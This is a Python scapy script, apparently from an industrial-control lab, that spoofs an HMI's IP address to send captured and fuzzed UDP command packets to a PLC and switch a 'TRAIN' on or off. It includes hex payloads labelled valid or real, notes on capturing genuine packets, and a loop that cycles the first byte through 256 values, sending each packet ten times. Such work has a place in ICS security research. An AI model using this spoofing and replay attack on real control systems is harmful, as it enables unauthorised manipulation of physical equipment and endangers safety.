# -*- coding: utf-8 -*-
import scapy.all as scapy
from random import randint
import threading, os, sys, optparse
import atexit
import time
from construct import *
from scapy.layers.l2 import Ether
from scapy.sendrecv import sendp, send
from scapy.layers.inet import UDP, IP

# ---------------------------------------
LocalIP = "192.168.3.103"
LocalMac  = "00:e0:4c:68:f9:4b"

HMI_IP = "192.168.3.18"
HMI_MAC = "28:e9:8e:24:bb:e0"

PLC_IP = "192.168.3.39"  # TargetM_IP
PLC_MAC = "30:be:3b:8a:1a:f9"

# ---------------------------------------

flag = 0

MITZ_LINK = Struct(
    'type' / Int16ul,
    'seq1' / Int16ul,
    'idk1' / Bytes(0xf),
    'length' / Int16ul,
    'idk2' / IfThenElse(this.type == 0x57, Bytes(0xe), Bytes(0x10)),
    'seq2' / Int8ul,
    'pad' / IfThenElse(this.type == 0x57, Bytes(this.length - 0xe - 1), Bytes(this.length - 0x10 - 1))
)

#                   "57 | 01 00 00 01 | 11 11 07 00 00 ff ff 03 00 00 00 00 00 00 22 00 1c 00 0a 08 00 00 00 00 00 00 00 00 14 02 2d 00 00 00 00 01 00 00 90 00 0a 00 00 00 00 00 00 00 01 00"      #?

# contruct more packet and try to find the regulation of valid packets

# to get true off packets, use filter udp and ip.src == 192.168.3.18 and udp.length == 63, each time to turn off it sends 3 and get the second one (forth pkt if turn on and turn off)
attack_packet_off="57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a0000000000000001000000000000000000" #orgin
off1             ="57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a000000000000000100" # valid
off2             ="57000000001111070000ffff0300000000000022001c000a0800000000000000001402450000000001000090000a000000000000000100" # real
off3             ="57000000001111070000ffff0300000000000022001c000a08000000000000000014025c0000000001000090000a000000000000000100" # real


# # to get true on packets, use filter udp and ip.src == 192.168.3.18 and udp.length == 63, each time to turn on it sends 3 and get the first one
# attack_packet_on ="57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a000000000000000000" #orgin
# on1              ="57000000001111070000ffff0300000000000022001c000a08000000000000000014020f0000000001000090000a000000000000000000" #valid
# on2              ="57000000001111070000ffff0300000000000022001c000a0800000000000000001402ff0000000001000090000a0000000000000000ff00" #valid
# on3              ="57000000001111070000ffff0300000000000022001c000a08000000000000000004020d00000001000000000090000000000000230000" #true packet


def Send_TRAIN_OFF():
    data_off = bytes.fromhex(attack_packet_off)
    data_off = bytes.fromhex(off3)
    # diff vlan so not set mac
    udpf = Ether() / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    #udpf = Ether(src=HMI_MAC, dst=PLC_MAC) / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_off)
    for _ in range(10):
        sendp(udpf)
    # udpf = Ether(src=PLC_MAC, dst=PLC_MAC) / IP(src=HMI_IP , dst=PLC_IP) / UDP(sport=5001, dport=5006) / ("00 11 22")
    # sendp(udpf)
    print("TRAIN OFF \n")
    # time.sleep(1)

def Send_TRAIN_ON(attack_packet_on):
    data_on = bytes.fromhex(attack_packet_on)
    #data_on = bytes.fromhex(on3)
    # diff vlan so not set mac
    udpf = Ether() / IP(src=HMI_IP, dst=PLC_IP) / UDP(sport=5001, dport=5006) / (data_on)
    for _ in range(10):
        sendp(udpf)
    print("TRAIN ON\n")
    # time.sleep(1)
    
def main():
    attack_packet_on = "57000000001111070000ffff0300000000000022001c000a08000000000000000014022d0000000001000090000a000000000000000000"

    for i in range(256):
        hex_value = format(i, '02x')
        modified_packet = hex_value + attack_packet_on[2:]
        print(f"Current value: {hex_value}\n")
        Send_TRAIN_ON(modified_packet)
        time.sleep(2)

    

if __name__ == '__main__':
    main()
